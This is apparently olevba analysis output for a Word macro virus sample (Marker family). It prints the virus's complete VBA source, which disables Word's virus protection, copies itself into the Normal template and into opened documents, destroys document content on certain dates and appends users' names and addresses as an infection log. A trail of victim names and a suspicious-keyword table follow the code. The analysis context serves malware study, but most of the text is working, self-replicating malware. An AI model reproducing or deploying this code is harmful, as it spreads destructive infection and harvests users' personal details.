olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-9c26231fbe418027d5b0d8e8e1435bdbd2e5061b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-9c26231fbe418027d5b0d8e8e1435bdbd2e5061b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CheckBox1_Click()

End Sub

Private Sub Document_Close()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim AD, NT As Object
    
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = AD.codemodule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = NT.codemodule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = AD.codemodule.Lines(1, AD.codemodule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For i = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next i

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            NT.codemodule.deletelines 1, NT.codemodule.CountOfLines
            NT.codemodule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = NT.codemodule.Lines(1, NT.codemodule.CountOfLines)

            AD.codemodule.deletelines 1, AD.codemodule.CountOfLines
            AD.codemodule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub

Private Sub Document_Open()
    
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    
    Const OldMarker = "<- this is another marker!"
    Const Marker = "WebMaster"
    
    Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
    Dim AD, NT As Object
    
    Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
    
    DocumentInfected = AD.codemodule.Find(Marker, 1, 1, 10000, 10000)
    NormalTemplateInfected = NT.codemodule.Find(Marker, 1, 1, 10000, 10000)
    
    If (Day(Now()) = 15) And (Month(Now()) Mod 2 = 0) Then
        ActiveDocument.Select
        Selection.Cut
        ActiveDocument.Save
    ElseIf (Day(Now()) = 13) Then
        ActiveDocument.Select
        Selection.Font.Name = "Webdings"
        ActiveDocument.Save
    End If

    'Make sure that some conditions are true before we continue infecting anything
    If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
        (ActiveDocument.SaveFormat = wdFormatDocument Or _
        ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
        'Infect the NormalTemplate
        If DocumentInfected = True Then
  
            SaveNormalTemplate = NormalTemplate.Saved
  
            OurCode = AD.codemodule.Lines(1, AD.codemodule.CountOfLines)

            'Write a log file of this NormalTemplate infection
            For i = 1 To Len(Application.UserAddress)
                If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
                    If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
                        UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
                    End If
                Else
                    UserAddress = UserAddress & Chr(13) & "' "
                End If
            Next i

            OurCode = OurCode & Chr(13) & _
                      "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                      Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
                      "' " & Application.UserName & Chr(13) & _
                      "' " & UserAddress & Chr(13)

            NT.codemodule.deletelines 1, NT.codemodule.CountOfLines
            NT.codemodule.AddFromString OurCode
    
            If SaveNormalTemplate = True Then NormalTemplate.Save
    
        End If


        'Infect the ActiveDocument
        If NormalTemplateInfected = True And _
            (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
             ActiveDocument.Saved = False) Then
  
            SaveDocument = ActiveDocument.Saved
    
            OurCode = NT.codemodule.Lines(1, NT.codemodule.CountOfLines)

            AD.codemodule.deletelines 1, AD.codemodule.CountOfLines
            AD.codemodule.AddFromString OurCode
    
            If SaveDocument = True Then ActiveDocument.Save
      
        End If
  
    End If
End Sub
' 02:01:14 PM - Sunday, 16 May 1999
' USER5
'



' 10:14:21 AM - Monday, 17 May 1999
' Neelam Darne
'



' 07:14:45 PM - Wednesday, 2 Jun 1999
' Mitesh Sanghani
'



' 04:00:44 PM - Saturday, 5 Jun 1999
' xxx
'



' 12:36:10 PM - Friday, 30 Jul 1999
' sameer
'



' 02:42:16 PM - Thursday, 5 Aug 1999
' sameer
'



' 04:48:15 PM - Thursday, 12 Aug 1999
' sameer
'



' 12:14:10  - sunnudagur, 26 sep 1999
' ***
'



' 12:54:19 PM - Friday, 5 Nov 1999
' ***
'



' 09:46:25 PM - Tuesday, 9 Nov 1999
' ***
'



' 04:20:58 PM - Monday, 22 Nov 1999
' CE OFFICE
'



' 03:13:08  - martedì, 23 nov 1999
' TRAINING DEPARTMENT
'



' 10:30:56 AM - Friday, 3 Dec 1999
' xx
'



' 11:48:00 AM - Friday, 3 Dec 1999
' xx
'



' 10:15:29 AM - Thursday, 13 Jan 2000
' xx
'



' 12:24:51 PM - Thursday, 13 Jan 2000
' M.Sivalingam
'



' 06:24:51 PM - Thursday, 18 Nov 1999
' mca
'



' 04:53:14  - Thursday, 20 Jan 2000
' Dr.Nadarajan
'



' 11:39:20 AM - Tuesday, 15 Feb 2000
' GRD Library
'



' 03:34:14 PM - Saturday, 19 Feb 2000
' psg
'



' 01:07:52 PM - Friday, 24 Mar 2000
' Righard J. Zwienenberg
'



' 08:31:02 <(©¿©)> - ïÿòíèöà, 24 ìàð 2000
' Replication System
'



' 10:37:58  - Freitag, 2 Jun 2000
' fs080298
' fs080298@hotmail.com


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |CheckBox1_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

